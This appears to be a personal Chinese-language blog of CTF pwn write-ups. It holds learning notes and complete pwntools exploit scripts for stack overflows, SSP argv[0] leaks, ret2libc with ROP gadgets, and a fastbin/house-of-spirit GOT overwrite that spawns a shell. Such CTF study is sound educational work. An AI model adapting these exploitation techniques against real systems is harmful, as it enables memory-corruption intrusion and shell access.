---
title: CTF | 201809-writeups
date: 2018-09-04 11:12:38
tags:
---
记录
<!-- more -->
希望能坚持下去。.. 一天一道可能吗 可不可能自己说了算啦 别人都做得到
### readme_revenge
分析程序，首先读取 name，之后输出，存在栈溢出漏洞？
反编译有问题，还是看汇编比较好，虽然我汇编很弱 orz
file strings checksec 一波 静态链接
python subprocess 模块
flag 在 0x00006B4040
首先输出 junk，程序崩溃，地址 0x000000000045ad64 
看 wp 知道了 rabin2 使用
为什么 rabin2 -z readme_revenge | grep 34C3 能知道 flag 被隐藏在程序中？
看 wp 说 __printf_modifier_table、__printf_function_table 和 printf_arginfo_table , 之前利用过。..

劫持控制流。...? flag 在程序中 打印出来就好，然而能想到这个也挺难的。..

#### __fortify_fail 函数 
__fortify_fail 函数 判断 need_backtrace && __libc_argv[0] != NULL 后打印 __libc_argv[0] 
__stack_chk_fail 调用了__fortify_fail 函数，__fortify_fail 函数调用了__libc_message 函数

利用思路：通过溢出覆盖指针， __libc_argv[0] 指向 flag 的地址就可以打印出 flag
libc_argv[0] 在 0x06B7980 
静态链接。...
printf 有个新奇的功能。.. Customizing 
环境变量 LIBC_FATAL_STDERR_=1 
查看 printf 的实现，想想怎么劫持控制流 
1. printf 调用 vprintf- do_positional-printf_positional-__parse_one_specwc 
__builtin_expect(EXP, N)。 意思是：EXP==N 的概率很大。
__builtin_expect((x),1) 表示 x 的值为真的可能性更大；
__builtin_expect((x),0) 表示 x 的值为假的可能性更大。

__printf_arginfo_table 是 printf_arginfo_size_function  结构体，我们可以伪造这个结构体
2. do_positional ?

printf_info 结构体
1.  调用_fortify_fail，伪造 printf_arginfo_size_function  包含 call _fortify_fail 的地址，对__printf_arginfo_table 取操作时，就会访问那个地址，从而执行。

2. 将** libc_argv 改了，这个地址
overflow 都能显示这两个。

*__printf_arginfo_table[spec->info.spec] 这里是怎么构造的。.?
看取的地址相对于__printf_arginfo_table 的偏移，就是 spec->info.spec 的值* 8，而 spec->info.spec 为 s，所以是 Ord(s)*8
format s offset 为什么是  ord("s")*8? 
注意 ljust 不会修改原来的字符产，所以需要赋值！

参考：https://github.com/r00ta/myWriteUps/tree/master/34C32017/pwn_readme_revenge

### jarvisoj guestbook
首先读取一长串字符串，过长会出现非法访问内存的错误
看到 good game 函数，会打开 flag.txt，所以应该劫持控制流让程序执行 good game 函数
覆盖返回地址为 good game
签到题 orz
payload
```python
from pwn import *

p = remote('pwn.jarvisoj.com',9876)
payload='a'*0x88+p64(0x0000400620)
p.sendline(payload)
p.interactive()
```

### jarvisoj smashes
利用__stack_chk_fail
flag 在 0x000600D21
利用漏洞打印出 flag
flag 上面有个变量，   
_IO_getc
会 overwriteflag 就是会修改原来的 flag
SSP
将`libc_argv[0]`的地址覆盖为 flag 地址
需要知道：
1. 程序运行时 argv[0] 的地址
2. 读取字符串存放的地址
在 main 下断点，查看 argv[0] 地址

使用 search 程序名 查找
在 __IO_gets 后一句下断点，获得输入字符串的地址
覆盖前会映射到别的地方，可以`search`一下
构造好 payload 发过去就行了
```python
from pwn import *
from time import *

p = remote('pwn.jarvisoj.com',9877)
p.recvuntil("name?")
payload = p64(0x400D20)*161
p.sendline(payload)
p.recvuntil('flag:')
p.sendline("1")
p.interactive()
```
**ELF 重映射：当可执行文件足够小时，在不同的区段可能被多次映射。**

推荐链接：
https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/
### jarvisoj test your memory
首先分析一下程序 
签到题。.
data 段有个 hint 
`0x80487E0` 为 `cat flag`字符串
返回地址要设置为 main 函数的地址 
payload:
```python
from pwn import *
#p = process("./memory")
p = remote("pwn2.jarvisoj.com",9876)
catflag_addr = 0x80487E0
sys_addr=0x80485BD
payload="a"*(0x13+4)+p32(sys_addr)+p32(0x8048677)+p32(catflag_addr)
p.sendline(payload)
p.interactive()
```

### level3 x64
很明显的栈溢出
但是怎么利用呢，给了 libc ，所以应该是 rop, 自己找 gadgets？
直接找 one_gadget 呢，还有熟悉一下 x64 寄存器内容
搜索 onegadgets 
pwngdb 里面是可以直接是有`rop`命令搜索的，还算方便

但是没有`rdx`的`gadgets` 呀，因为不知道 libc 的基址。.. 也没法用 libc 的，我们的目的是使 rdx>=8，如果满足就可以不用管了，可以调一调看满不满足 

X64 使用寄存器传参 
1. 构造 write 的调用栈打印函数 got 地址
  `write(0,read_got,0x08)` 将`rdi-0，rsi-read_got,rdx-0x08`
  32 位：`system_plt, 'b' * 4, binsh_addr`函数参数在函数返回地址的上方
  ，函数调用时入栈顺序为：
实参 N~1→主调函数返回地址→主调函数帧基指针 EBP→被调函数局部变量 1~N
  64 位：参数依次保存在`RDI, RSI, RDX, RCX, R8 和 R9 `寄存器中，如果还有更多的参数的话才会保存在栈上
2. 计算`Libc `基址，获得`system`地址
3. 构造 `system`调用栈  

复习一下 x64 传参顺序！
需要的有。..
用约定 `32: eax—syscall`号 `ebx,ecx,edx`参数 64: `rax—syscall`号 `rdi,rsi,rdx,rcx,r8,r9`
```python
from pwn import *
import logging
#p = process("./level3_x64")
p= remote("pwn2.jarvisoj.com", 9883)
elf = ELF('./level3_x64')
libc = ELF("libc-2.19.so")

pop_rdi = 0x0004006b3
pop_rsi=0x00000000004006b1
vun_addr = 0x004005E6
read_got = elf.got['read']
exit_libc_address = 0x3c1e0
write_plt = 0x0004004B0 
print(hex(read_got))
print(hex(write_plt))
#payload = flat(['a'*0x88,pop_rdi,0x1,pop_rsi,read_got,0,write_plt,vun_addr])

payload= 'a'*0x88+p64(pop_rdi)+p64(0x1)+p64(pop_rsi)+p64(read_got)+p64(0)+p64(write_plt)+p64(vun_addr)

#gdb.attach(p)
p.recvuntil("Input:\n")
p.send(payload)
data = p.recv(8)
read_addr = u64(data[0:8])
print hex(read_addr)
libc_base = read_addr-libc.symbols['read']
sys_addr = libc_base+libc.symbols['system']
print hex(sys_addr)
exit_address = libc_base + exit_libc_address
binsh_addr = libc.search("/bin/sh").next()+libc_base
print hex(binsh_addr) 

#payload=flat(['a'*0x88,pop_rdi,binsh_addr,sys_addr,0xdeadbeef])
payload = 'a'*0x88+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(exit_address)
p.send(payload)
p.interactive()
```

### level5
mmap 和 mprotect 练习，假设 system 和 execve 函数被禁用，请尝试使用 mmap 和 mprotect 完成本题。 
没学过。.mmap mprotect 刚好可以练练

不让用 system 和 execve，所以是执行`shellcode`
使用`mprotect` ，先`leak`出地址
`__libc_csu_init()`的一条万能`gadgets!`
`_dl_runtime_resolve()`中的 gadget, 通过这个 gadget 可以控制六个 64 位参数寄存器的值，当我们使用参数比较多的函数的时候（比如 mmap 和 mprotect）就可以派上用场了。
`disassemble __libc_csu_init`

大致思路：
· 使用`mmap`开一段可以执行的空间，将`shellcode`放进去执行 
· 使用`mprotect`，讲一段空间设置为`RWX`，将`shellcode`放进去执行

具体思路是这样的： 
1、通过`libc`和`write`函数泄露出`write`函数在内存中地址，计算出`mprotect`函数地址 
2、劫持`GOT`表，覆盖某些表项的地址，通过`read`函数可以输入这些地址，将`mprotect`函数地址，`bss`段地址写到`GOT`表中去，为了下一步可以通过 call 命令直接调用 
3、使用`__libc_csu_init`函数末尾的通过`gadgets`进行函数调用，执行`mprotect`设置为可移植性，然后执行`shellcode`获取权限 
好难。.
int mprotect(void *addr, size_t len, int prot);
log.info()
利用 write 函数泄露出 libc 内存信息  `write(1,write_got,8)`

然后计算出 mprotect 函数在 libc 中的地址 

将 shellcdoe 写入 bss 段

将 bss 地址和 mprotect 地址写入 got 表 

最后用通用 gadget 调用 mprotect 函数将 bss 段设置为可执行

然后跳转到 bss 在 got 表的地址执行 shellcode

看别人 wp 的思路：`栈溢出 -> leak read -> hijack got -> write shellcode to bss -> call mprotect to set ‘rwx’ -> exec shellcode`
先根据大佬的 exp 调一遍 orz
一般设置 r12 为我们指向需要的地址的指针的地址（有点绕），rbx 为 0，rbp 为 1

错位产生的 gadgets
```
pop rdi，ret
pop rsi，pop r15,ret 
```
x/5i  address 
`___gmon_start__` 符号，干嘛来着。..

gadgets 分两部分使用
1. 
```
1. 执行 gad1

.text:000000000040089A                 pop     rbx  必须为 0
.text:000000000040089B                 pop     rbp  必须为 1
.text:000000000040089C                 pop     r12  call!!!!
.text:000000000040089E                 pop     r13  arg3
.text:00000000004008A0                 pop     r14  arg2
.text:00000000004008A2                 pop     r15  arg1
.text:00000000004008A4                 retn  ——> to gad2
```

2. 

```
.text:0000000000400880                 mov     rdx, r13
.text:0000000000400883                 mov     rsi, r14
.text:0000000000400886                 mov     edi, r15d
.text:0000000000400889                 call    qword ptr [r12+rbx*8] call!!!
.text:000000000040088D                 add     rbx, 1
.text:0000000000400891                 cmp     rbx, rbp
.text:0000000000400894                 jnz     short loc_400880
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn ——> 构造一些垫板 (7*8=56byte) 就返回了
```
嗯。.. 都理解了。.. 写 wp 的话。.. 还是有点问题 
感觉利用挺有趣的

gmon_start 
 指向 gmon 初始化函数，该函数开始记录 profiling 信息并在 atexit() 中注册了一个清理函数。 

### level4 

#### 借助 dynELF 实现无 libc 的漏洞利用

栈溢出
和 3 差不多，但是没有 libc
因此需要自己泄露 libc 地址 
同理，构造 write 泄露两个函数地址。..
得到 libc 版本，有必要知道 Libc 版本吗？? 有 因为 system 需要
32 位 的程序

直接泄露 system 函数的地址就好了！把 bin/sh 传到 bss 段
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']

泄露地址用 got, 执行用 plt
为什么不行呢。... 看 wp 别人都可以 连接超时，为什么呢。.. 先放一下吧

### jarivsoj level6
freenote。
很明显有个 double free 漏洞

有点搞不清结构。..
只有 dalao 的博客 orz
利用 double free, 触发 unlink 

### guestbook 2
堆题，先看 delete
添加堆块有一个结构体：
```
00000000 block           struc ; (sizeof=0x18, mappedto_6)
00000000                                         ; XREF: list_struct/r
00000000 inuse           dq ?
00000008 length          dq ?
00000010 ptr             dq ?
00000018 block           ends
00000018
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 list_struct     struc ; (sizeof=0x1810, mappedto_8)
00000000 sum             dq ?
00000008 number          dq ?
00000010 block           block 256 dup(?)
00001810 list_struct     ends
```

free 的时候没有把指针置为 null，并且没有判断是否 free 过，所以有 double 漏洞，因此我们可以构造 unlink

定义结构体。.
首先要弄清楚结构！
不能直接 edit free 过的堆块，但是我想直接利用 double 就可以啦
使用 unlink ，修改对指针指向 bss 段，然后修改这个 chunk 是得 chunkx 的 ptr 实际为某函数 got 的地址，再修改 chunk-x，就是把 free 的 got 修改为 system 函数地址，往 chunk3 中写入/bin/sh ，调用 free，就可以成功 getshell 

最多只能申请 256 个堆块，在 add 函数和 edit 函数中，真实 malloc 的 size 都是对用户输入的 len0x80 字节对齐后的？
是吗。.. 在 add 函数中我看不出来这样的对齐？

噢，`reallo`c 函数的问题，之前没理解。... 
如果是扩大内存操作会把 ptr 指向的内存中的数据复制到新地址（新地址也可能会和原地址相同，但依旧不能对原指针进行任何操作）；如果是缩小内存操作，原始据会被复制并截取新长度。

为什么会这样子打印呢。
printf 函数中的"%s"直到遇到内存中的'\0'标志时才会结束输出。
实在不明白为什么会输出那个地址。

**unsorted bin 从头部插入，从尾部取出**
offset 是怎么算出来来着？? 自己算了一下就好了。..
学到了 system("$0")

### fastbin attack oreo 
利用这道题练习一下 fastbin 
首先分析程序的函数
 
**add**
在 head 头部插入新的 rifle 结构体指针
rifle 结构体：

```python
00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
00000000 descript        db 25 dup(?)
00000019 name            db 27 dup(?)
00000034 next            dd ?                    ; offset
00000038 rifle           ends
```
可以看到读取 name 和 descript 时都是 0x38, 溢出了。
![1](http://p6cwaqxnz.bkt.clouddn.com/oreo-1.png)

**show_rifles**
输出每个 rifle 的 name

**order**
清空链表，free 掉申请的块，从 head 开始 free, 但是没有置为 null，因此有漏洞。order_num+1

**message**
读取 0x80 字串

**show_stats**
输出当前的信息

整理一下，程序申请的块都是 0x38，fastbin, 有 double free 漏洞。可以利用 fastbin attack

看一下 bss 段数据的布局：
```
.bss:0804A288 head            dd ?                    ; DATA XREF: add+11↑r
.bss:0804A288                                         ; add+25↑w ...
.bss:0804A28C                 align 20h
.bss:0804A2A0 order_num       dd ?                    ; DATA XREF: order+5A↑r
.bss:0804A2A0                                         ; order+62↑w ...
.bss:0804A2A4 rifle_cnt       dd ?                    ; DATA XREF: add+C5↑r
.bss:0804A2A4                                         ; add+CD↑w ...
.bss:0804A2A8 ; char *notice
.bss:0804A2A8 notice 
```

Symbol 'main arena' not found. Try installing libc debugging symbols and try again.
怎么办。.

首先申请两个块，查看信息：

布局是这样的：（借网上的图）  
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-layout.png?imageView2/2/w/400)

再看 order 后：  

![](http://p6cwaqxnz.bkt.clouddn.com/oreo-order-layout.png?imageView2/2/w/400)  

先 free b, 再 free a。fastbin 从头部插入，所以 a 的 fd 指向 chunk b，而 chunk b 的 fd 为 null

再来分析一下，程序读取时有溢出，可以覆盖整个块。即我们可以伪造 next 指针，并且可以覆盖到下一个块的内容。 

![](http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-1.png?imageView2/2/w/400)  

![](http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-2.png?imageView2/2/w/400)

利用：
**地址泄露**
利用溢出，使 next 指向我们想要泄露内容的地址，再通过 show，达到了地址泄露  
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-leak-address.png?imageView2/2/w/400)  
**fastbin attack**  
构造 fake chunk:
可以在`0x804A2A0`处构造，对应的 size 为`rifle_cn`t，可以通过`add`多次使它的值为 0x41, 满足要求  
构造 chunk 2 的 fd 指向 fake chunk 地址：  
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-fastbin-chain.png?imageView2/2/w/400)

fake chunk 结构：  
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-fake-chunk.png?imageView2/2/w/400)

因此整个利用过程为：
1. 泄露 libc 基址，得到 system 函数地址
2. 添加`0x3f`个块
3. 释放掉这些块
4. 申请新的块，如上图构造`fastbin chain`, 此时申请新的块为第一次申请的`chunk 1`
5. 构造`chunk 1`的内容，覆盖`chunk 2`的 fd 指针为`0x804A2A0`
6. 构造好`0x804A2A0 `中的内容，将 notice 指向 free 的 got
7. 此时 rifle_cnt 刚好为 0x41 ，申请 chunk , 此时会将 ·0x804A2A0· 分配出去，
8. 通过`message` 函数修改`strlen got`为`system` message 内容 system 地址+";sh\x00"
9. `get shell`

最后相当于调用 `system("\x??\x??\x??;sh")` 很巧妙 0.0  
head 指针指向 notice     
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-notice.png?imageView2/2/w/400)

getshell:   
![](http://p6cwaqxnz.bkt.clouddn.com/oreo-yeah.png)

本地 libc 地址 直接`vmmap`就看到了。
```python
from pwn import *
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./oreo"
oreo = ELF("./oreo")
if args['REMOTE']:
    p = remote(ip, port)
else:
    p = process("./oreo")
log.info('PID: ' + str(proc.pidof(p)[0]))
#libc = ELF('./libc.so.6')
libc=ELF('/lib/i386-linux-gnu/libc-2.24.so')

def add(name, descrip):
    p.sendline('1')
    p.sendline(name)
    p.sendline(descrip)

def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')

def order():
    p.sendline('3')

def message(notice):
    p.sendline('4')
    p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)

def exp():
    name = 27 * 'a' + p32(oreo.got['puts'])
    add(name, 'b')
    show_rifle()
    p.recvuntil('===================================\n')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    log.success(hex(system_addr))
    oifle = 1
    while oifle < 0x3f:
        add('a' * 27 + p32(0),'b')
        oifle += 1
    add("a","b")
    order()
    add('a' * 27 + p32(0)+p32(0)+p32(0x41)+p32(0x0804a2a8-8),'b')
    add('a','b')
    add("a",p32(oreo.got['strlen']))
    gdb.attach(p)
    message(p32(system_addr)+";sh\x00")
    p.interactive()

if __name__ == "__main__":
    exp()
```

#### house of spirit
（1）伪造堆块
在可控 1 及可控 2 构造好数据，将它伪造成一个 fastbin。

（2）覆盖堆指针指向上一步伪造的堆块。（覆盖哪里的堆指针）

（3）释放堆块，将伪造的堆块释放入 fastbin 的单链表里面。

（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。  
参考链接：  
https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717
https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/

### inndy smashes-the-stack

签到题
```python
from pwn import *
sh = process("./smash-the-stack")

buf_addr = p32(0x804A060)
sh.sendline(buf_addr*0x50)
sh.interactive()
```

### stack pivoting  b0verfl0w 
来复习一下 `stach pivoting`反正所有东西对我来说学跟没说过一个样，都忘了。..
劫持指针指向攻击者能控制的内存区，之后通过 ROP 利用
常见的情况
1. 可以控制栈溢出字节少，构造 ROP 不方便
2. 开启 PIE(ASLR) 保护，无法确定栈地址

### IO FILE
